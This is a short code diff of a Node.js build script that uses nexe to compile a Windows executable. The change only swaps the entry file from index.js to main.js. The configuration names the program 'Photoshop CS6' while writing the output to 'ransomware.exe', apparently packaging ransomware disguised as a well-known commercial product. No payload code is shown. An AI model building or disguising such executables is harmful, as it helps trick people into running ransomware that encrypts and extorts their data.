@@ -1,7 +1,7 @@
 const { compile } = require("nexe");
 
 compile({
-  input: "./index.js",
+  input: "./main.js",
   name: "Photoshop CS6",
   output: "./dist/ransomware.exe",
   target: "win32-x86-11.12.0",
